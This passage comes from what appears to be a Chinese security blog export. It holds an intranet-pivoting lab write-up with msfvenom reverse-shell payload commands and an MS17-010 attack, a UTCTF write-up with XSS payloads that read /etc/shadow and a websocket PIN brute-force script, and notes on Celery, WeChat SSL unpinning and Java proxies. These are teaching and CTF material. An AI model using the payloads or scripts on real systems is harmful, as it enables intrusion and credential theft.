<p><strong>scokts4代理一般都是走的tcp所以这个代理完使用nmap使用-sT ，别的可能会无法扫描到端口。但是测试过程中发现sockts5是无法进行nmap的端口扫描的 还不知道是什么原因。我这里扫描端口使用的是TCP端口扫描工具，但是sockts5穿透网络进行http访问是没有问题的，而kali和攻击机（macos）使用sockts4进行nmap扫描也是没有问题的,就是需要-sT。</strong></p>
<h3 id="MSF穿透三层内网打445"><a href="#MSF穿透三层内网打445" class="headerlink" title="MSF穿透三层内网打445"></a>MSF穿透三层内网打445</h3><p>这里我们不再赘述如何攻击靶机只谈论如何使用msf攻击第三层的靶机3（windows机器，445存在漏洞）</p>
<p>这里我们在我们的攻击机上启动msfconsole,同时生成一个反向连接的elf木马通过蚁剑上传到靶机1（即192.168.123.29&#x2F;192.168.22.131）上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.123.221 LPORT=9987 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf </span><br></pre></td></tr></table></figure>

<p>然后我们的msfconsole设置监听,蚁剑执行上线：</p>
<p><img data-src="/images/pages/image-20221006111135484.png" alt="image-20221006111135484"></p>
<p>上线后我们直接添加路由</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006111234927.png" alt="image-20221006111234927"></p>
<p>我们使用主机发现模块和端口扫描模块进行内网扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/*</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006112132980.png" alt="image-20221006112132980"></p>
<p>可以发现128这个ip存在多个端口，然后我们拿下128的shell。此时我们使用msfvenom进行一个正向木马的生成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=9002 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure>

<p>msfconsole开启新的监听,然后蚁剑上传并执行得到session：</p>
<p><img data-src="/images/pages/image-20221006112417935.png" alt="image-20221006112417935"></p>
<p>现在我们在此添加路由</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/image-20221006112507814.png" alt="image-20221006112507814"></p>
<p>然后经过主机发现192.168.33.33存在445，尝试一下ms17010:</p>
<p><img data-src="/images/pages/image-20221006112657017.png" alt="image-20221006112657017"></p>
<p>这样我们就打到了第三层的靶机3</p>
<p>所有靶机我们都拿到了：</p>
<p><img data-src="/images/pages/image-20221006113952985.png" alt="image-20221006113952985"></p>
<p><strong>备注</strong>：拿到meterpreter时不要退出使用background后台挂起，否则无法继续渗透。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>frp单层代理确实非常稳定，但是多层代理时并不是很好用，还是推荐使用msf。msf的工具挺齐全的可以基本做到完整的内网穿透利用。当然msf也提供了sockts5的代理，当需要使用的时候可以使用msf进行sockts代理的开启，然后使用proxifier工具进行其他工具的代理使用。在测试过程中发现sockts5的代理无论是msf的还是frp的在进行nmap扫描的时候都会出问题，目前原因还未可知。</p>
<p>下次有时间搞明白为什么sockts5在进行nmap代理的时候无法扫描端口。无论是frp的sockts5还是msf生成的sockts5都存在这个问题。</p>
<h2 id="更新补充"><a href="#更新补充" class="headerlink" title="更新补充"></a>更新补充</h2><p>sockts5代理官方有说明并不能完全支持所有应用，所以sockts5支持nmap是有问题的。<br>另外scokts4可以支持部分扫描 仅可使用-sT参数</p>
<p>详情参考 <a href="https://security.stackexchange.com/questions/120708/nmap-through-proxy">https://security.stackexchange.com/questions/120708/nmap-through-proxy</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF-WEB-WP</title>
    <url>//posts/UTCTF-WEB-WP/</url>
    <content><![CDATA[<h2 id="UTCTF"><a href="#UTCTF" class="headerlink" title="UTCTF"></a>UTCTF</h2><p>UTCTF是由德克萨斯大学奥斯汀分校的信息与系统安全协会运营的，面向全世界所有人。此次正好是一个练手机会，最终排名第20，其中主要做了一些web和流量分析的题目，这里简单写下wp。</p>
<span id="more"></span>

<h2 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目是一个把html转为PDF的功能。</p>
<p><img data-src="/images/pages/image-20220325172212225.png" alt="image-20220325172212225"></p>
<p>这里由于题目关闭没有渲染后的PDF截图了，大致就是一个图片渲染进去了。我们通过下载这个PDF文件，并查看文件内容可以看到我们的图片确实是被解析了。说明我们的代码是被执行了的，所以此处存在xss，现在我们就是需要利用xss来读取文件。</p>
<p>其实这里面还有一个细节就是大部分第三方组件生成的PDF都在头部信息有标明，这就涉及到信息搜集的敏感度了。一般在PDF文件头信息或者是burp的响应中能看到关键组件信息，有时候他也存在于响应的UA中,此题目通过下载的PDF头查看到用的是wkhtmltopdf组件，此组件网上也有现成的漏洞资料。</p>
<p><a href="https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/">https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/</a></p>
<p>常理说我们不应该可以直接iframe进行文件读取，比如下面这样通常会有问题</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///xxxxx/xxxxx/*.py&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们先来看看常见情况下iframe标签读取会遇到什么问题？</p>
<p><img data-src="/images/pages/image-20220325175606918.png" alt="image-20220325175606918"></p>
<p><img data-src="/images/pages/image-20220325175535786.png" alt="image-20220325175535786"></p>
<p>可以看到提示跨域http协议不能file协议读本地文件，因为file协议和http协议不同源，所以我们在一些xss中无法使用上面的代码进行文件获取。</p>
<p>但是因为wkhtmltopdf在转换pdf的时候使用的是file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;xxxxx&#x2F;test.html 这种读取的本地html文件，所以我们此处用iframe的src file协议即可同源读取。</p>
<p>但是如果我们直接读取 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 会发现读不到，这是因为从Gecko 1.9开始，file协议中的文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。所以我们仍需要想办法跨域。</p>
<p>这里用的是XHR跨域读取本地文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/shadow&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>拿到shadow,直接看密码，登录即可得flag</p>
<p><img data-src="/images/pages/image-20220327222214792.png" alt="image-20220327222214792"></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>那么如果遇到跨域问题我们如何进行跨域的读取呢？</p>
<p>这里我们可以通过两种方式来实现</p>
<h4 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h4><p>CORS跨域资源共享是目前的主流方案，基本所有浏览器都支持，当然IE需要版本新一点。CORS跨域资源共享本质是一种协约。</p>
<p>原理就是浏览器通过XMLHttpRequest发送跨域请求，并自动添加一些附加header信息，同时服务端约定了Access-Control-Allow-Origin（允许的跨域请求域名）和Access-Control-Allow-Methods（允许的跨域请求方式）响应头，如果符合标准则返回资源内容，否则一般是403。</p>
<p>当然一些复杂请求比如跨域的PUT和DELETE会稍微复杂一点，会先OPTION预请求下服务端同样验证通过后再进行下一步的跨域请求，此处的实现细节和简单的GET和POST请求可能略有不同，此处不在展开，以免占太大篇幅，以后有机会再详细讲讲。</p>
<p>那么基于此我们就知道如何进行跨域请求了：XMLHttpRequest<br>payload1:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面可以跨域 但是真正能不能请求成功需要看服务端的Access-Control-Allow-Origin（允许的跨域请求域名）和Access-Control-Allow-Methods（允许的跨域请求方式）两个字段的规则<br>由于此题目的Origin是file:&#x2F;&#x2F; 所以此处符合同源策略可直接读取。</p>
<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>jsonp跨域就是把想要跨域的内容直接当作js请求返回，众所周知</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxxx.com/dsadsa.js</span>&gt;</span>标签是可以跨域的</span><br></pre></td></tr></table></figure>

<p>这个一般不好利用来读取本地文件，但是他也存在一些其他的安全问题，这个以后再说。</p>
<h2 id="Websockets"><a href="#Websockets" class="headerlink" title="Websockets"></a>Websockets</h2><p>打开题目就是一个网站展示页</p>
<p><img data-src="/images/pages/image-20220328212136142.png" alt="image-20220328212136142"></p>
<p>其中login url有一个登录端口</p>
<p><img data-src="/images/pages/image-20220328212202236.png" alt="image-20220328212202236"></p>
<p>输入错误的用户名会提示用户名不存在，如果是正确的则是pin不正确，所以基于此可以确定用户名admin，然后F12查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;topbox&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can&#x27;t remember jack --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;PIN&quot;</span> <span class="attr">required</span> <span class="attr">pattern</span>=<span class="string">&quot;(\d&#123;3&#125;|\d&#123;16&#125;)&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/login.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以知晓是三位数字爆破，但是这里考察的是websoket爆破，因为通信是websocket协议</p>
<p>我们直接写一个python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;ws://web1.utctf.live:8651/internal/ws&#x27;</span></span><br><span class="line">PINLENGTH = <span class="number">3</span></span><br><span class="line">USERNAME = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">tryLoginWith</span>(<span class="params">pin</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(URL) <span class="keyword">as</span> websocket:</span><br><span class="line">        begin = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">if</span> begin == <span class="string">&#x27;begin&#x27;</span>:</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;begin&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;user <span class="subst">&#123;USERNAME&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> websocket.send(<span class="string">f&#x27;pass <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            data = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[&lt;&lt;&lt;] Data: <span class="subst">&#123;data&#125;</span> | Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-] Wrong Pincode: <span class="subst">&#123;pin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">args</span>):</span><br><span class="line">    asyncio.run(tryLoginWith(<span class="built_in">str</span>(args).zfill(PINLENGTH)))</span><br><span class="line"></span><br><span class="line">args = [ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>) ]</span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">100</span>) <span class="keyword">as</span> pool:</span><br><span class="line">    pool.<span class="built_in">map</span>(send,args)</span><br></pre></td></tr></table></figure>

<p>登录即可获取flag</p>
<h2 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h2><p>这道题目的考点其实很明确，就是要连续正确识别1000个验证码。</p>
<p>首先测试可以得知每个cookie都对应了一个验证码，且记录了正确的次数，这可以保证我们即使识别错误依然可以回退到上一个验证码的cookie，不必从头开始。至于验证码识别我常用的是muggle模块，但是验证码过于复杂，无法识别，此处需要过滤噪音。我一个同事发现此验证码的背景图片几乎一致，如果我们把背景图片抠出来然后再xor就能拿到纯验证码的图片，然后再muggle识别就ok了。</p>
<p>最后我们抠出如图</p>
<p><img data-src="/images/pages/image-20220328213232959.png" alt="image-20220328213232959"></p>
<p>尽管xor后的图片仍然可能比较模糊 但是正确率已经足够</p>
<p>最终我们获得了flag</p>
<p>网上别的wp用的python ocr是 pytesseract 这个大家可以合理参考。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://juejin.cn/post/6913541999735881741">https://juejin.cn/post/6913541999735881741</a></li>
<li><a href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery实现定时任务</title>
    <url>//posts/Celery-timing/</url>
    <content><![CDATA[<h1 id="Celery定时任务"><a href="#Celery定时任务" class="headerlink" title="Celery定时任务"></a>Celery定时任务</h1><h2 id="celery-beat"><a href="#celery-beat" class="headerlink" title="celery beat"></a>celery beat</h2><p>定时任务由 Celery Beat 进程周期性地将任务发往任务队列，所以我们需要启动一个Celery Beat和一个Celery Worker。Celery Beat启动方式和Celery Worker一致，下面我们先来看下Celery定时任务怎么coding。</p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>首先是定时任务的各种设置</p>
<h3 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h3><p>默认情况下是UTC 时区，可以通过timezone修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">timezone=<span class="string">&#x27;Europe/London&#x27;</span></span><br><span class="line"><span class="comment"># 或者配置中国时间</span></span><br><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span> </span><br><span class="line">app.conf.enable_utc = <span class="literal">False</span> </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="beat-schedule"><a href="#beat-schedule" class="headerlink" title="beat_schedule"></a>beat_schedule</h3><p>定时任务的核心配置</p>
<p>task： 指定任务的名字<br>schedule : 设定任务的调度方式，可以是一个表示秒的整数，也可以是一个 timedelta 对象，或者是一个 crontab 对象（后面介绍），总之就是设定任务如何重复执行<br>args：     任务的位置参数以列表的形式<br>kwargs：任务的关键字参数,以字典的形式<br>options：所有 apply_async 所支持的参数</p>
<p>一个常见的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">myapp.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="comment"># m每分钟一次demo_schedule任务</span></span><br><span class="line">    <span class="string">&#x27;sending_email_minute&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;sending_email&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),</span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="string">&quot;123456@qq.com&quot;</span>, <span class="string">&quot;hello&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="执行周期的对象"><a href="#执行周期的对象" class="headerlink" title="执行周期的对象"></a>执行周期的对象</h3><p><strong>timedelta 对象</strong></p>
<p>表示间隔时间执行，是比较简单的一种定时方式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"></span><br><span class="line">timedelta(seconds=<span class="number">3</span>), <span class="comment">#每三秒 执行一次</span></span><br></pre></td></tr></table></figure>

<p><strong>crontab 对象</strong></p>
<p>参考与linux的crontab定制方式，可进行细节化定制定时任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#schedule配置举例</span></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"><span class="comment"># 每分钟执行一次</span></span><br><span class="line">crontab()</span><br><span class="line"><span class="comment"># 每天凌晨十二点执行</span></span><br><span class="line">crontab(minute=<span class="number">0</span>, hour=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 或者这么写，每小时执行一次</span></span><br><span class="line">crontab(minute=<span class="number">0</span>, hour=<span class="string">&quot;*/1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="加载配置"><a href="#加载配置" class="headerlink" title="加载配置"></a>加载配置</h2><p>1、app.conf.参数名称 &#x3D; 参数值<br>2、app.config_from_object(配置文件路径)<br>3、app.conf.update(<br>    参数名称&#x3D;参数值,<br>    参数名称&#x3D;参数值<br>)</p>
<h2 id="Celery-beat-和-Worker启动"><a href="#Celery-beat-和-Worker启动" class="headerlink" title="Celery beat 和 Worker启动"></a>Celery beat 和 Worker启动</h2><p>1、celery -A celery_server.myapp beat -l debug</p>
<p>2、celery -A celery_server.myapp worker</p>
<h2 id="定时任务demo"><a href="#定时任务demo" class="headerlink" title="定时任务demo"></a>定时任务demo</h2><p>celery_server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># redis开启后 启动下面两个任务</span></span><br><span class="line"><span class="comment"># 1、celery -A celery_server.myapp beat -l debug</span></span><br><span class="line"><span class="comment"># 2、celery -A celery_server.myapp worker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"> </span><br><span class="line">myapp = Celery(<span class="string">&#x27;schedule&#x27;</span>)</span><br><span class="line">myapp.conf.broker_url = <span class="string">&#x27;redis://localhost:6379/0&#x27;</span></span><br><span class="line">myapp.conf.result_backend = <span class="string">&#x27;redis://localhost:6379/1&#x27;</span></span><br><span class="line">myapp.conf.imports = [<span class="string">&#x27;celery_task&#x27;</span>]</span><br><span class="line">myapp.conf.worker_concurrency = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">myapp.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="comment"># 每分钟一次demo_schedule任务</span></span><br><span class="line">    <span class="string">&#x27;sending_email_minute&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;sending_email&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),</span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="string">&quot;123456@qq.com&quot;</span>, <span class="string">&quot;hello&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>celery_task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># redis开启后 启动下面两个任务</span></span><br><span class="line"><span class="comment"># 1、celery -A celery_server.myapp beat -l debug</span></span><br><span class="line"><span class="comment"># 2、celery -A celery_server.myapp worker</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> celery_server <span class="keyword">import</span> myapp</span><br><span class="line"></span><br><span class="line"><span class="meta">@myapp.task(<span class="params">name=<span class="string">&#x27;sending_email&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_email</span>(<span class="params">email,content</span>):</span><br><span class="line">	requests.get(<span class="string">&quot;http://redis.xxxxx.ceye.io&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(email+<span class="string">&quot;发送成功&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>进入到代码所在目录，启动：</p>
<p>celery -A celery_server.myapp beat -l debug</p>
<p>celery -A celery_server.myapp worker</p>
<p>定时任务就会定时执行。</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>后续如果遇到更复杂的定时任务的时候再接着补充，目前仅用到了一些简单的定时任务模块。</p>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>微信最新版小程序burp抓包</title>
    <url>//posts/android_wechat_minipro_burp/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我的手机是安卓9.0 本来一直用的微信6.0，微信6.0证书随便信任，所以抓包也一直没问题。但是最近测试的时候发现微信版本太低会导致部分小程序打开界面有问题，无奈只能升级到最新微信版本，同时进行了抓包的配置。所以记录了一下。</p>
<h2 id="微信版本对手机系统证书的支持"><a href="#微信版本对手机系统证书的支持" class="headerlink" title="微信版本对手机系统证书的支持"></a>微信版本对手机系统证书的支持</h2><ul>
<li>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书</li>
<li>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书</li>
<li>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</li>
</ul>
<span id="more"></span>

<h2 id="如何burp抓包"><a href="#如何burp抓包" class="headerlink" title="如何burp抓包"></a>如何burp抓包</h2><h3 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h3><p>1、到处burp的der证书<br>2、转换证书</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform der -<span class="keyword">in</span> cacert.der -out burp.pem </span><br></pre></td></tr></table></figure>

<p>3、生成hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -<span class="keyword">in</span>  burp.pem</span><br></pre></td></tr></table></figure>

<p>4、重命名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> burp.pem 9a5ba575.0</span><br></pre></td></tr></table></figure>

<h3 id="倒入证书"><a href="#倒入证书" class="headerlink" title="倒入证书"></a>倒入证书</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push 9a5ba575.0 /data/local/tmp/ <span class="comment"># 直接放系统目录是没权限的</span></span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cp</span>  /data/local/tmp/9a5ba575.0 /system/etc/security/cacerts/ <span class="comment"># 迁移到系统根证书</span></span><br><span class="line"><span class="built_in">chmod</span>  644 9a5ba575.0 <span class="comment"># 给权限</span></span><br></pre></td></tr></table></figure>

<p>重启后登陆进入设置中查看证书：portSwigger</p>
<p><img data-src="/images/pages/image-20220615180710327.png" alt="image-20220615180710327"></p>
<p>如图证书已经装进系统目录</p>
<h2 id="burp抓包"><a href="#burp抓包" class="headerlink" title="burp抓包"></a>burp抓包</h2><p>这时候我们设置代理，进行抓包会发现仍无法抓取小程序的包。因为以下规则。</p>
<blockquote>
<p>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表</p>
</blockquote>
<p>你可以理解为双向证书绑定了，只信任自己内置的证书，所以我们要向别的app hook证书那样解决这个问题。这里我们直接用前人的工具了：<a href="https://github.com/ac-pm/SSLUnpinning_Xposed">sslunpining</a></p>
<p>xpose 直接抓这个插件 并hook微信 重启后即可抓包。</p>
<p><img data-src="/images/pages/image-20220615181428598.png" alt="image-20220615181428598"></p>
<p>这样微信就可以信任第三方证书了，我们的burp就可以抓包了。</p>
<p>当然有能力的大佬可以直接逆微信apk的源码写个frida hook，毕竟第三方工具不一定一直有效。</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>//posts/Java-proxy/</url>
    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>最近在看java的动态代理，做下笔记</p>
<h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>代购：如果你想买的东西在国外，你一般不会飞过去买完再飞回来，而是有个中介，帮你处理这件事，这个中介就是代购，也就是代理。帮你办一件事就是代理。</p>
<p>客户 —– 代理（代购） ——国外商场</p>
<p>为什么找代购？</p>
<p>便宜省心专业，我不能自己去国外买。同时代购为了自己的优势，不让买家接触自己的进货渠道，你想要这个价格和服务就只能通过代购。所以很多时候只能通过代购来买东西。</p>
<span id="more"></span>

<h3 id="类比到java"><a href="#类比到java" class="headerlink" title="类比到java"></a>类比到java</h3><p>A类想调用C类的方法，但是C不允许A直接调用，这时候可以通过代理B来进行操作。</p>
<p>A-&gt;B-&gt;C  </p>
<p>C-&gt;B-&gt;A</p>
<p>看起来很傻对不对？但是是实际情况需求。</p>
<p>比如付款需要短信验证码，你不可能直接找移动联通说发条短信。而是找第三方公司，他们总包了一个大业务，一天几十万条给移动联通签合同。然后你买他们的，他们再付钱给移动联通。</p>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h3 id="什么是代理模式"><a href="#什么是代理模式" class="headerlink" title="什么是代理模式"></a>什么是代理模式</h3><p>A类想调用C类的方法，但是C不允许A直接调用，这时候可以通过代理B来进行操作。这种程序的调用关系称为代理模式。</p>
